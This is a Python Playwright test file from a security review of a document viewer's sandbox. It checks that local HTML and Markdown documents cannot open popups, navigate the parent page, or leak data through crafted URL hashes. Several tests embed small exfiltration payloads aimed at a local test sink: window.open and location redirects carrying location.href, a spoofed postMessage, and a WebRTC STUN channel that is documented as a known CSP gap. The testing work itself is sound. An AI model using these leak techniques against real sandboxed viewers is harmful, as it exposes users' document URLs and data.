# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 Atacama <contact@atacama.tech>

"""Independent security review of /view (2026-10-01), browser half: findings 2, 3, 10.

Local documents lose allow-popups; external Markdown links open through the
mesh; a crafted ``#web:https://…`` hash opens nothing. The two channels CSP
cannot close (the frame navigating itself, WebRTC) are strict known defects:
if a browser ever closes one, the xfail turns into a failure and the test must be updated to expect the closed channel.
"""

import asyncio
import socket
from urllib.parse import quote

import pytest

import docs
from helpers import KnownDefect, expect_fixed
from test_view_compat import open_mesh


def html(home_dir, name, body):
    return docs.write(home_dir, f"review/{name}.html",
                      f"<!doctype html><html><body><p id='ready'>ready</p>{body}</body></html>")


async def show_in_panel(page, mesh, doc):
    await open_mesh(page, mesh)
    await page.evaluate("(t) => openWeb(t)", str(doc))
    await page.locator("iframe.web:not([hidden])").wait_for()


# ---------------------------------------------------------------- finding 2: no popups

async def test_a_top_level_document_cannot_open_a_window(page, mesh, sink, home_dir):
    doc = html(home_dir, "open", f"<script>window.open('{sink.origin}/leak?u=' "
                                 "+ encodeURIComponent(location.href));</script>")
    await page.goto(await mesh.url(doc))
    await sink.assert_untouched()
    assert len(page.context.pages) == 1


async def test_a_panel_document_cannot_open_a_window(page, mesh, sink, home_dir):
    doc = html(home_dir, "open-panel", f"<script>window.open('{sink.origin}/leak');</script>")
    await show_in_panel(page, mesh, doc)
    await sink.assert_untouched()
    assert len(page.context.pages) == 1


async def test_a_panel_document_cannot_navigate_the_mesh(page, mesh, sink, home_dir):
    doc = html(home_dir, "top", f"<script>try {{ top.location = '{sink.origin}/top'; }} "
                                "catch (e) {}</script>")
    await show_in_panel(page, mesh, doc)
    await sink.assert_untouched()
    assert page.url.startswith(mesh.origin)


async def test_markdown_external_link_opens_a_tab_through_the_mesh(page, mesh, sink, home_dir):
    md = docs.write(home_dir, "review/links.md", f"[ext]({sink.origin}/ext)\n")
    await show_in_panel(page, mesh, md)
    link = page.frame_locator("iframe.web:not([hidden])").locator("#doc a")
    async with page.context.expect_page() as opened:
        await link.click()
    tab = await opened.value
    await tab.wait_for_load_state()
    assert tab.url == f"{sink.origin}/ext"
    assert await tab.evaluate("window.opener") is None
    assert page.url.startswith(mesh.origin)
    assert "/view/" in await page.locator("iframe.web:not([hidden])").get_attribute("src")


async def test_only_a_markdown_pane_may_ask_the_mesh_to_open_a_tab(page, mesh, sink, home_dir):
    doc = html(home_dir, "ask", f"<button id='go' onclick=\"parent.postMessage("
                                f"{{smesh: 'open', url: '{sink.origin}/ask'}}, '*')\">go</button>")
    await show_in_panel(page, mesh, doc)
    await page.frame_locator("iframe.web:not([hidden])").locator("#go").click()
    await sink.assert_untouched()
    assert len(page.context.pages) == 1


# ---------------------------------------------------------------- finding 10: hash restore

async def test_a_crafted_hash_does_not_open_an_external_site(page, mesh, sink):
    await open_mesh(page, mesh)
    await page.goto(mesh.origin + "/#" + quote(f"web:{sink.origin}/hash", safe=""))
    await page.reload()
    await page.wait_for_function("panes.length > 0")
    await sink.assert_untouched()
    srcs = await page.locator("iframe.web").evaluate_all("(fs) => fs.map((f) => f.src)")
    assert not [src for src in srcs if src.startswith(sink.origin)]


async def test_a_local_document_in_the_hash_is_restored(page, mesh, home_dir):
    doc = docs.report(home_dir)
    await open_mesh(page, mesh)
    await page.goto(mesh.origin + "/#" + quote(f"web:{doc}", safe=""))
    await page.reload()
    await page.wait_for_function("[...document.querySelectorAll('iframe.web')]"
                                 ".some((f) => new URL(f.src, location.href).pathname.endsWith('/report.html'))")


# ---------------------------------------------------------------- residual channels (R2)

@pytest.mark.xfail(raises=KnownDefect, strict=True,
                   reason="known CSP limit: CSP cannot stop a frame navigating itself")
async def test_a_document_cannot_send_its_url_by_navigating(page, mesh, sink, home_dir):
    doc = html(home_dir, "nav", f"<script>location = '{sink.origin}/nav?u=' "
                                "+ encodeURIComponent(location.href);</script>")
    await page.goto(await mesh.url(doc))
    await asyncio.sleep(1.0)
    expect_fixed(sink.hits == [], f"navigation reached the sink: {sink.hits}")


@pytest.mark.xfail(raises=KnownDefect, strict=True,
                   reason="known CSP limit: Chromium applies no CSP to WebRTC")
async def test_a_document_cannot_send_data_over_webrtc(page, mesh, home_dir):
    udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp.bind(("127.0.0.1", 0))
    udp.setblocking(False)
    try:
        port = udp.getsockname()[1]
        doc = html(home_dir, "rtc", "<script>const pc = new RTCPeerConnection({iceServers: "
                                    f"[{{urls: 'stun:127.0.0.1:{port}'}}]}}); pc.createDataChannel('x');"
                                    "pc.createOffer().then((o) => pc.setLocalDescription(o));</script>")
        await page.goto(await mesh.url(doc))
        packets = []
        for _ in range(30):
            await asyncio.sleep(0.1)
            try:
                packets.append(udp.recv(2048))
            except BlockingIOError:
                pass
        expect_fixed(packets == [], f"{len(packets)} STUN packet(s) left the sandbox")
    finally:
        udp.close()
